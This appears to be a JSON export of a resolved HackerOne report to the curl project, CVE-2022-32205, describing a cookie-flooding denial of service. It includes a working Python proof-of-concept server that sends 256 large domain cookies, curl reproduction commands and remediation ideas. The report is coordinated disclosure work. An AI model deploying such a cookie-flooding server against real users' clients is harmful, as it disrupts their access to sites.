{
  "id": 1569946,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTY5OTQ2",
  "url": "https://hackerone.com/reports/1569946",
  "title": "CVE-2022-32205: Set-Cookie denial of service",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2022-05-13T19:53:49.142Z",
  "submitted_at": "2022-05-13T19:53:49.246Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "nyymi",
    "url": "/nyymi",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 35663,
    "url": "https://hackerone.com/curl",
    "handle": "curl",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "curl",
      "twitter_handle": "",
      "website": "https://curl.se",
      "about": "cURL is an Open Source project providing a library and command-line tool for doing internet transfers"
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2022-32205"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2022-06-27T06:56:08.520Z",
  "bug_reporter_agreed_on_going_public_at": "2022-06-27T06:56:08.477Z",
  "team_member_agreed_on_going_public_at": "2022-06-27T06:52:20.005Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\nCurl fails to limit the number of cookies that can be set by a single host/domain. It can easily lead to a situation where constructing the request towards a host will end up consuming more than `DYN_HTTP_REQUEST` memory, leading to instant `CURLE_OUT_OF_MEMORY`.\n\nAny host in a given domain can target any other hosts in the same domain by using domain cookies. The attack works from both `HTTP` and `HTTPS` and from unprivileged ports.\n\n## Steps To Reproduce:\n  1. Run the following python web server:\n```\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass MyServer(BaseHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(200)\n        for i in range(0,256):\n            self.send_header(\"Set-Cookie\", \"f{}={}; Domain=hax.invalid\".format(i, \"A\" * 4092))\n        self.end_headers()\n\nif __name__ == \"__main__\":\n    webServer = HTTPServer((\"127.0.0.1\", 9000), MyServer)\n    try:\n        webServer.serve_forever()\n    except KeyboardInterrupt:\n        pass\n    webServer.server_close()\n ```\n  2.  `curl -c cookie.txt -b cookie.txt --connect-to evilsite.hax.invalid:80:127.0.0.1:9000 http://evilsite.hax.invalid/`\n  3.  `curl -c cookie.txt -b cookie.txt --connect-to targetedsite.hax.invalid:80:127.0.0.1:9000 http://targetedsite.hax.invalid/`\n\nThis is CWE-770: Allocation of Resources Without Limits or Throttling\n\n# Remediation ideas\nThe cookie matching being as complicated as it is makes it a bit hard to create a fix that always works fine. The request inhabits other headers as well as the cookies, so the amount of storage available for the cookies also varies per request.\n\nOne relatively \"easy\" way to mitigate this would be to limit the amount of domain cookies a domain can have. But what should be done if  `Set-Cookie` would go over this limit? Maybe flush the oldest cookies?\n\n## Impact\n\nDenial of service",
  "weakness": {
    "id": 120,
    "name": "Allocation of Resources Without Limits or Throttling"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2022-07-27T06:52:20.095Z",
  "allow_singular_disclosure_after": -48929606.82009655,
  "singular_disclosure_allowed": true,
  "vote_count": 4,
  "voters": [
    "zy9ard3",
    "polem4rch",
    "shivammusic",
    "d3basis"
  ],
  "severity": {
    "rating": "low",
    "author_type": "Team"
  },
  "structured_scope": {
    "databaseId": 18844,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/curl/curl",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
